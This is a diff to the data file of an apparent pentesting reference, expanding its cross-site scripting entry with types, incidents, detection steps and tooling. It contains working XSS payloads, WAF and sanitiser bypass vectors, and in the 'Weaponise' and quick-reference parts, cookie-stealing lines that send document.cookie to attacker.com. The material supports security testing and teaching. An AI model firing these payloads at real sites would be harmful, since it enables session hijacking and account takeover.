@@ -1290,11 +1290,11 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/cross-site-scripting",
         description: "Attacker-controlled script executes in another user's browser, stealing sessions and acting as the victim.",
-        brief: "Cross-Site Scripting occurs when an application places untrusted data into a page (or into client-side JavaScript) without encoding it for the context it lands in, so the browser parses the attacker's data as executable script instead of inert text. The injected JavaScript then runs inside the victim's origin, with full access to everything that origin can do: reading non-HttpOnly cookies and tokens, making authenticated same-origin requests as the victim, reading the DOM, keylogging, phishing via injected UI, and rewriting the page.\n\nXSS comes in three delivery modes. Reflected XSS echoes the payload straight back from the request into the response, so it is delivered by luring the victim to a crafted link. Stored (persistent) XSS saves the payload server-side (a comment, profile field, filename, support ticket) and fires for every user who views it — the most dangerous because it needs no lure and often hits admins. DOM-based XSS never involves the server reflecting anything: client-side JavaScript reads a source it controls (location.hash, location.search, postMessage) and writes it into a dangerous sink (innerHTML, document.write, eval). A stored payload that fires somewhere you cannot see (an admin dashboard, a log viewer) is blind XSS, caught with an out-of-band callback.\n\nThe single most important concept is context: the same input is safe in one place and dangerous in another, and the payload that works depends entirely on where the reflection lands (HTML body, tag attribute, inside <script>, inside a URL, inside a CSS block). The universal fix is the same principle everywhere — encode on output for the exact context, and prefer safe sinks over dangerous ones. Impact runs from nuisance to full account takeover and, chained with CSRF or admin functionality, to site-wide compromise.",
+        brief: "Cross-Site Scripting is a client-side injection flaw: the application puts untrusted data into a page (or into client-side JavaScript) without encoding it for the context it lands in, so the browser parses the attacker's data as executable script instead of inert text. The injected JavaScript then runs inside the victim's origin with the full authority that origin has — reading non-HttpOnly cookies and tokens, making authenticated same-origin requests as the victim, reading and rewriting the DOM, keylogging, and phishing through injected UI.\n\nBecause the code only runs in the browser, XSS never directly compromises the back-end server and is confined to the same-origin sandbox of the vulnerable site (and the browser's JS engine). On its own that caps the raw impact — but XSS is so widespread, and the actions it enables (session hijack, account takeover, worming) so severe, that it stays a serious, actively-exploited class rather than a nuisance. It has also historically been the delivery vehicle for browser-engine exploits that break out of the sandbox entirely.\n\nXSS comes in three delivery modes. Stored (persistent) XSS saves the payload server-side — a comment, profile field, filename, support ticket — and fires for every user who views it, so it needs no lure and often reaches admins; it is the most critical type and can be hard to remove. Reflected (non-persistent) XSS echoes the payload straight back from the request into the response (a search result or error message) and is delivered by luring the victim to a crafted link. DOM-based XSS never has the server reflect anything: client-side JavaScript reads a source it controls (location.hash, location.search, postMessage) and writes it into a dangerous sink (innerHTML, document.write, eval). A stored payload that fires somewhere you cannot see — an admin dashboard, a log viewer — is blind XSS, caught with an out-of-band callback.\n\nThe single most important concept is context: the same input is safe in one place and dangerous in another, and the payload that works depends entirely on where the data lands (HTML body, tag attribute, inside <script>, inside a URL, inside a CSS block). The universal fix follows from that — encode on output for the exact context, and prefer safe DOM APIs over dangerous sinks.",
         quickReference: [
-          { label: "Reflected probe", cmd: "<script>alert(document.domain)</script>   \"><img src=x onerror=alert(1)>" },
+          { label: "Confirm it fires (origin-aware)", cmd: "<script>alert(window.origin)</script>   <script>print()</script>   <plaintext>" },
+          { label: "Reflected / HTML-body probe", cmd: "\"><img src=x onerror=alert(document.domain)>   <svg onload=alert(1)>" },
           { label: "Attribute / string break-out", cmd: "\"><svg onload=alert(1)>     ';alert(1)//     '-alert(1)-'" },
-          { label: "No-script / filtered vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <details open ontoggle=alert(1)>" },
           { label: "Session theft (concept)", cmd: "<script>new Image().src='//atk/?c='+document.cookie</script>" }
         ],
         sections: [
@@ -1304,9 +1304,31 @@ var VULNS = [
             items: [
               "The browser decides whether bytes are code or content based on where they sit in the document. XSS happens when attacker data crosses from a data position into a code position because the app failed to encode it for that spot.",
               "Correct defence is context-aware output encoding: HTML-entity-encode in HTML text, attribute-encode (and quote) in attributes, JavaScript-string-encode inside <script>, URL-encode in URL components, and CSS-encode in style. One encoding does not fit all contexts.",
+              "XSS runs only client-side, inside the browser's JS engine and (in modern browsers) only within the vulnerable site's own origin — it does not give code execution on the server. Its reach is the victim's session and everything that origin can do.",
               "DOM XSS is a client-side variant: no server encoding can fix it because the unsafe write happens in the browser — it is fixed by using safe DOM APIs (textContent, setAttribute) instead of sinks (innerHTML, document.write, eval, setTimeout(string)).",
               "HttpOnly stops script reading a cookie but does NOT stop XSS — the attacker can still ride the session with same-origin fetch/XHR, so HttpOnly limits one impact, not the vulnerability.",
               "mXSS (mutation XSS) exploits the browser re-parsing sanitised HTML after DOM insertion, turning inert markup into live script — which is why home-grown sanitisers fail and DOMPurify exists."
+            ]
+          },
+          {
+            title: "The Three Types",
+            type: "table",
+            columns: ["Type", "How it works", "Persistence & reach"],
+            rows: [
+              ["Stored (Persistent)", "Payload is saved in the back-end (comment, profile, filename, ticket) and served to everyone who views the page.", "Persists across refreshes; hits every viewer, often including admins. The most critical type."],
+              ["Reflected (Non-Persistent)", "Payload is sent in the request and echoed straight back into the response (search result, error message) without being stored.", "One-shot; only affects the user who follows the crafted link. Usually delivered via a GET URL."],
+              ["DOM-based (Non-Persistent)", "Client-side JavaScript reads an attacker-controlled source and writes it to a dangerous sink — the data may never reach the server.", "One-shot; often keyed off a URL #fragment, so it never appears in the raw HTTP request or base page source."],
+              ["Blind (a stored variant)", "Stored payload that executes in a context you cannot observe (admin panel, log viewer, internal tooling).", "Confirmed only by an out-of-band callback that fires when a privileged user renders it."]
+            ]
+          },
+          {
+            title: "Why It Matters (real-world weight)",
+            type: "notes",
+            items: [
+              "Samy worm (MySpace, 2005): a stored XSS that re-posted itself to every profile that viewed an infected page — over a million infections in ~24 hours, the fastest-spreading worm of its time.",
+              "TweetDeck (2014): a reflected/stored XSS produced a self-retweeting tweet that spread 38,000+ times in minutes, forcing Twitter to pull TweetDeck offline to patch.",
+              "XSS has surfaced repeatedly in top-tier targets — Google Search, Apache httpd — which is why it must be treated seriously despite its 'client-side only' framing.",
+              "Impact runs from nuisance to full account takeover, and when chained with CSRF or admin functionality, to site-wide compromise. Historically it has also been the first stage of browser-engine (sandbox-escape) exploits."
             ]
           },
           {
@@ -1317,7 +1339,7 @@ var VULNS = [
               "Every stored/displayed field: comments, usernames and display names, profile bios, addresses, message bodies, filenames of uploads, support tickets, and anything an admin later views (stored / blind).",
               "Client-side sinks: grep the JS for innerHTML, outerHTML, document.write, insertAdjacentHTML, eval, Function(), setTimeout/setInterval with strings, jQuery .html()/.append(), and location assignments fed from location.hash/search or postMessage (DOM).",
               "Non-obvious sinks: SVG/HTML file uploads served inline, Markdown renderers, PDF/HTML export, custom email templates, and JSON reflected into a <script> block.",
-              "Header/less-common reflections: Referer, User-Agent, and custom headers echoed into error or admin pages."
+              "Header/less-common reflections: Referer, User-Agent, Cookie, and custom headers echoed into error or admin pages — XSS is not limited to visible form fields."
             ]
           },
           {
@@ -1327,11 +1349,21 @@ var VULNS = [
               { label: "Inject a unique marker", cmd: "# a distinctive, harmless token you can grep for in the response and DOM\nq=xz9k7qmarker\n# note EVERY place it appears and HOW it is encoded there" },
               { label: "Classify the context", cmd: "HTML body        <div>MARKER</div>          -> inject a tag\nAttribute (quoted) value=\"MARKER\"           -> close the quote/tag: \">\nAttribute (unquoted) value=MARKER           -> add an event handler with a space\nInside <script>  var x='MARKER';            -> break the string: ';payload//\nURL / href       href=\"MARKER\"              -> javascript: scheme\nCSS              style=\"...MARKER...\"        -> expression / url() vectors" },
               { label: "See what survives encoding", cmd: "# submit  <>\"'`  and check which come back raw vs entity-encoded\n# raw < and > in HTML body = tag injection likely works\n# only \" encoded but ' raw in a single-quoted attr = still exploitable" },
-              { label: "Reflected vs DOM", cmd: "# if the marker is in the raw HTTP response -> server-side reflection\n# if it appears only after JS runs (view source clean, DOM dirty) -> DOM XSS" }
+              { label: "Reflected vs DOM", cmd: "# View Source (Ctrl+U) shows the RAW server response\n# if the marker is in that raw response -> server-side reflection\n# if it appears only in the live DOM (Inspect / Ctrl+Shift+C) but not View Source -> DOM XSS\n# a #fragment parameter and NO network request on submit also means DOM XSS" }
             ]
           },
           {
-            title: "Step 2 — Payloads by Context",
+            title: "Step 2 — Confirm It Executes",
+            type: "commands",
+            commands: [
+              { label: "Origin-aware alert (preferred)", cmd: "<script>alert(window.origin)</script>\n# alert the ORIGIN, not a static 1 — if the form is inside a cross-domain\n# iframe, the popup reveals which origin actually executed the code" },
+              { label: "When alert() is blocked or sandboxed", cmd: "<script>print()</script>     # opens the print dialog, rarely blocked\n<plaintext>                  # stops rendering everything after it -> proves injection\nconsole.log(window.origin)   # visible in DevTools when popups are suppressed" },
+              { label: "Prove persistence (stored vs reflected)", cmd: "# submit the payload, then RELOAD the page with no payload in the request:\n#  - still fires  -> Stored / Persistent (affects every visitor)\n#  - gone         -> Reflected / Non-Persistent (needs a crafted link per victim)" },
+              { label: "Verify in the page source", cmd: "# confirm the payload landed UN-encoded where you expect:\n#   <ul id=\"todo\"><script>alert(window.origin)</script></ul>   -> executes\n#   &lt;script&gt;...                                            -> encoded, safe here" }
+            ]
+          },
+          {
+            title: "Step 3 — Payloads by Context",
             type: "table",
             columns: ["Context", "Payload"],
             rows: [
@@ -1346,17 +1378,18 @@ var VULNS = [
             ]
           },
           {
-            title: "Step 3 — Filter & WAF Bypass",
-            type: "commands",
-            commands: [
-              { label: "When <script> is blocked", cmd: "# event handlers on other tags need no <script>:\n<svg onload=alert(1)>\n<img src=x onerror=alert(1)>\n<body onpageshow=alert(1)>\n<details open ontoggle=alert(1)>\n<input autofocus onfocus=alert(1)>" },
-              { label: "When parentheses / quotes are filtered", cmd: "# backticks call functions:  alert`1`\n# no quotes: use String.fromCharCode or /regex/.source or template literals\n# throw/onerror trick:  <img src=x onerror=alert`1`>\nonerror=alert;throw 1                       # arg-less call via throw" },
-              { label: "Case, encoding & obfuscation", cmd: "<sCrIpT>alert(1)</sCrIpT>                  # tags are case-insensitive\n# HTML entities in attributes are decoded before JS runs:\n<a href=\"javas&#99;ript:alert(1)\">\n# double URL-encoding / overlong UTF-8 to slip a WAF that decodes late\n# eval(atob('...')) to hide the payload body" },
-              { label: "Break naive sanitisers", cmd: "# incomplete tag stripping — nest so removal creates a live tag:\n<scr<script>ipt>alert(1)</scr</script>ipt>\n<<script>alert(1)//<</script>\n# mXSS: markup that mutates into script when re-parsed (use DOMPurify to defend)" }
+            title: "DOM XSS — Source & Sink",
+            type: "notes",
+            items: [
+              "Source = the JavaScript that reads attacker-controlled input (a URL parameter, location.hash, an input field, postMessage). Sink = the function that writes it into the DOM. DOM XSS exists when a source flows into a dangerous sink with no sanitisation in between.",
+              "Trace it in code: e.g. var pos=document.URL.indexOf('task='); var task=document.URL.substring(pos+5); (source) feeding document.getElementById('todo').innerHTML = '...'+decodeURIComponent(task); (sink) is directly exploitable.",
+              "innerHTML will NOT run a bare <script> tag inserted after load — so DOM payloads use self-executing markup instead: <img src='' onerror=alert(window.origin)> or <svg onload=alert(1)>.",
+              "Deliver DOM XSS the same way as reflected: the input often sits in a #fragment (e.g. /#task=<img src=x onerror=alert(1)>), so the payload never leaves the browser — copy the URL and send it to the victim.",
+              "Dangerous JS sinks: document.write(), element.innerHTML/outerHTML, insertAdjacentHTML, eval/Function, setTimeout/setInterval(string). Dangerous jQuery sinks: .html(), .append(), .after(), .add(), and $() fed a selector you control."
             ]
           },
           {
-            title: "DOM XSS — Sources & Sinks",
+            title: "DOM XSS — Sources & Sinks (quick map)",
             type: "table",
             columns: ["Sources (attacker-controlled)", "Dangerous sinks (execution)"],
             rows: [
@@ -1369,7 +1402,17 @@ var VULNS = [
             ]
           },
           {
-            title: "Step 4 — Weaponise",
+            title: "Step 4 — Filter & WAF Bypass",
+            type: "commands",
+            commands: [
+              { label: "When <script> is blocked", cmd: "# event handlers on other tags need no <script>:\n<svg onload=alert(1)>\n<img src=x onerror=alert(1)>\n<body onpageshow=alert(1)>\n<details open ontoggle=alert(1)>\n<input autofocus onfocus=alert(1)>" },
+              { label: "When parentheses / quotes are filtered", cmd: "# backticks call functions:  alert`1`\n# no quotes: use String.fromCharCode or /regex/.source or template literals\n# throw/onerror trick:  <img src=x onerror=alert`1`>\nonerror=alert;throw 1                       # arg-less call via throw" },
+              { label: "Case, encoding & obfuscation", cmd: "<sCrIpT>alert(1)</sCrIpT>                  # tags are case-insensitive\n# HTML entities in attributes are decoded before JS runs:\n<a href=\"javas&#99;ript:alert(1)\">\n# double URL-encoding / overlong UTF-8 to slip a WAF that decodes late\n# eval(atob('...')) to hide the payload body" },
+              { label: "Break naive sanitisers", cmd: "# incomplete tag stripping — nest so removal creates a live tag:\n<scr<script>ipt>alert(1)</scr</script>ipt>\n<<script>alert(1)//<</script>\n# mXSS: markup that mutates into script when re-parsed (use DOMPurify to defend)" }
+            ]
+          },
+          {
+            title: "Step 5 — Weaponise",
             type: "commands",
             commands: [
               { label: "Steal a non-HttpOnly cookie", cmd: "<script>new Image().src='//attacker.com/?c='+encodeURIComponent(document.cookie)</script>\n<script>fetch('//attacker.com/?c='+document.cookie)</script>" },
@@ -1390,6 +1433,17 @@ var VULNS = [
             ]
           },
           {
+            title: "Discovery — Automated & Manual",
+            type: "notes",
+            items: [
+              "Scanners do a passive scan (reviewing client-side code for DOM sources/sinks) and an active scan (firing payloads and diffing the rendered source). Burp Pro, Nessus and OWASP ZAP cover all three types; results always need manual confirmation, since a reflected payload is not the same as an executed one.",
+              "Open-source helpers: XSStrike (fuzzes a parameter, fingerprints the WAF, generates context-aware payloads), dalfox (fast CLI scanning and parameter analysis), kxss/Gxss (find reflected params and which special characters survive), BruteXSS and XSSer (payload brute-forcing).",
+              "Example: python xsstrike.py -u \"http://target/index.php?task=test\" — it reports reflections found, generates payloads, and flags an efficient one; you then verify it by hand.",
+              "Manual testing: work through curated lists (PayloadsAllTheThings, payload-box/xss-payload-list) against each input. Most list payloads target a specific injection point or filter, so many will not fire — which is why blind copy/paste is slow and a small custom script that submits payloads and diffs the response is often more efficient.",
+              "The most reliable method is code review of both front-end and back-end: trace how each input is handled all the way to the browser. For mature targets, where scanners and lists find nothing, manual review is what surfaces the surviving bugs."
+            ]
+          },
+          {
             title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
@@ -1407,6 +1461,7 @@ var VULNS = [
             columns: ["Tool", "Purpose"],
             rows: [
               ["Burp Suite + DOM Invader", "Manual probing, context analysis, automated DOM-XSS source/sink tracing"],
+              ["XSStrike", "Fuzzes parameters, fingerprints WAFs, and generates context-aware payloads"],
               ["dalfox", "Fast automated XSS scanning, parameter analysis, and payload generation"],
               ["XSS Hunter / ezXSS", "Blind XSS callbacks with DOM, cookies, and screenshots"],
               ["kxss / Gxss", "Find reflected parameters and which special chars survive"],
@@ -1421,7 +1476,8 @@ var VULNS = [
               { label: "OWASP — XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
               { label: "OWASP — DOM-based XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" },
               { label: "PortSwigger — XSS cheat sheet (interactive)", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" },
-              { label: "PayloadsAllTheThings — XSS Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" }
+              { label: "PayloadsAllTheThings — XSS Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" },
+              { label: "XSStrike — automated XSS discovery", url: "https://github.com/s0md3v/XSStrike" }
             ]
           },
           {
